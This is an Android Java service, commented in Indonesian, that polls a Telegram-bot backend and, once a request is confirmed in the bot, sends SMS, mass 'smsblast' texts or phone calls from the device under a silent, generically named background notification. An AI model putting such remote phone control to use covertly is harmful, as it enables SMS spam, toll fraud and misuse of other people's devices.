package com.example.app;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;

import androidx.annotation.Nullable;

import org.json.JSONObject;

/**
 * Service polling untuk request SMS dan telepon dari Telegram.
 *
 * Alur:
 * 1. User kirim /sms atau /call → GAS buat request status PENDING_CONFIRM
 * 2. Bot kirim pesan konfirmasi dengan inline button [Ya] [Batalkan]
 * 3. User klik Ya → GAS update status jadi CONFIRMED
 * 4. Service ini mendeteksi CONFIRMED → eksekusi SMS/call
 * 5. Kirim hasil balik ke GAS → Telegram
 *
 * Wajib di AndroidManifest.xml:
 *   <service android:name=".PhonePollingService" android:exported="false"/>
 */
public class PhonePollingService extends Service {

    private static final String TAG             = "PhonePollingService";
    private static final String CHANNEL_ID      = "phone_polling";
    private static final int    NOTIFICATION_ID = 12000;

    private static final long POLL_INTERVAL_MS = 5_000L; // lebih cepat untuk responsivitas

    private Handler  pollHandler;
    private Runnable pollRunnable;
    private boolean  isPolling    = false;
    private boolean  isProcessing = false;

    // =========================================================
    // LIFECYCLE
    // =========================================================

    @Override
    public void onCreate() {
        super.onCreate();
        pollHandler = new Handler(Looper.getMainLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startForeground(NOTIFICATION_ID, buildNotification());

        if (!isPolling) {
            isPolling    = true;
            pollRunnable = this::poll;
            pollHandler.post(pollRunnable);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isPolling = false;
        if (pollHandler != null && pollRunnable != null) {
            pollHandler.removeCallbacks(pollRunnable);
        }
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    // =========================================================
    // POLLING
    // =========================================================

    private void poll() {

        if (!isPolling) return;

        if (isProcessing) {
            scheduleNextPoll(POLL_INTERVAL_MS);
            return;
        }

        new Thread(() -> {

            try {
                JSONObject result = ApiHelper.getPhoneRequest();

                if (result == null ||
                        !"success".equalsIgnoreCase(
                                result.optString("status", ""))) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                JSONObject request = result.optJSONObject("request");

                if (request == null) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                String requestId = request.optString("id",        "");
                String operation = request.optString("operation", "");
                String params    = request.optString("params",    "");
                String reqStatus = request.optString("status",    "");

                if (requestId.isEmpty() || operation.isEmpty()) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                // Hanya eksekusi yang sudah CONFIRMED
                if (!"CONFIRMED".equals(reqStatus)) {
                    scheduleNextPoll(POLL_INTERVAL_MS);
                    return;
                }

                Log.d(TAG, "Phone request CONFIRMED: op=" + operation);

                isProcessing = true;
                handlePhoneRequest(requestId, operation, params);

            } catch (Exception e) {
                Log.e(TAG, "Error polling phone", e);
                isProcessing = false;
                scheduleNextPoll(POLL_INTERVAL_MS);
            }

        }).start();
    }

    private void scheduleNextPoll(long delayMs) {
        if (!isPolling) return;
        pollHandler.postDelayed(pollRunnable, delayMs);
    }

    // =========================================================
    // HANDLE REQUEST (setelah user konfirmasi)
    // =========================================================

    private void handlePhoneRequest(
            String requestId, String operation, String params) {

        final Context ctx = getApplicationContext();

        new Thread(() -> {

            boolean success = false;
            String  message;

            try {

                switch (operation.toLowerCase()) {

                    case "sms": {
                        // params: "nomor|pesan"
                        String[] parts  = params.split("\\|", 2);
                        String   number = parts.length > 0 ? parts[0].trim() : "";
                        String   text   = parts.length > 1 ? parts[1].trim() : "";

                        success = SmsHelper.sendSms(ctx, number, text);
                        message = success
                                ? "✅ SMS terkirim ke *" + number + "*\n" +
                                  "Pesan: " + text
                                : "❌ Gagal mengirim SMS ke " + number;
                        break;
                    }

                    case "smsblast": {
                        // params: "nomor1,nomor2|pesan"
                        String[] mainParts = params.split("\\|", 2);
                        String[] numbers   = mainParts.length > 0
                                ? mainParts[0].split(",") : new String[0];
                        String   text      = mainParts.length > 1
                                ? mainParts[1].trim() : "";

                        int sent  = SmsHelper.sendSmsToMany(ctx, numbers, text);
                        success   = sent > 0;
                        message   = "📤 SMS Blast selesai\n" +
                                    "Terkirim: *" + sent + "/" +
                                    numbers.length + "* nomor";
                        break;
                    }

                    case "call": {
                        success = CallHelper.makeCall(ctx, params.trim());
                        message = success
                                ? "📞 Memanggil *" + params.trim() + "*..."
                                : "❌ Gagal melakukan panggilan ke " + params.trim();
                        break;
                    }

                    case "emergency": {
                        success = CallHelper.makeCall(ctx, params.trim());
                        message = success
                                ? "🚨 *EMERGENCY CALL* ke *" + params.trim() + "*"
                                : "❌ Gagal emergency call";
                        break;
                    }

                    default:
                        message = "❌ Operasi tidak dikenal: " + operation;
                        break;
                }

            } catch (Exception e) {
                Log.e(TAG, "Error handling phone request", e);
                message = "❌ Error: " + e.getMessage();
            }

            ApiHelper.sendPhoneResult(requestId, success, message);

            isProcessing = false;
            scheduleNextPoll(POLL_INTERVAL_MS);

        }).start();
    }

    // =========================================================
    // NOTIFIKASI
    // =========================================================

    private Notification buildNotification() {

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID, "Myapk", NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.setSound(null, null);
            channel.enableVibration(false);
            channel.enableLights(false);
            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(channel);
        }

        Notification.Builder builder =
                new Notification.Builder(this, CHANNEL_ID)
                        .setContentTitle("Myapk")
                        .setContentText("Berjalan di latar belakang")
                        .setSmallIcon(android.R.drawable.ic_menu_call)
                        .setOngoing(true);

        return builder.build();
    }

    // =========================================================
    // HELPER STATIS
    // =========================================================

    public static void start(Context context) {
        Intent intent = new Intent(context, PhonePollingService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }
    }

    public static void stop(Context context) {
        context.stopService(new Intent(context, PhonePollingService.class));
    }
}
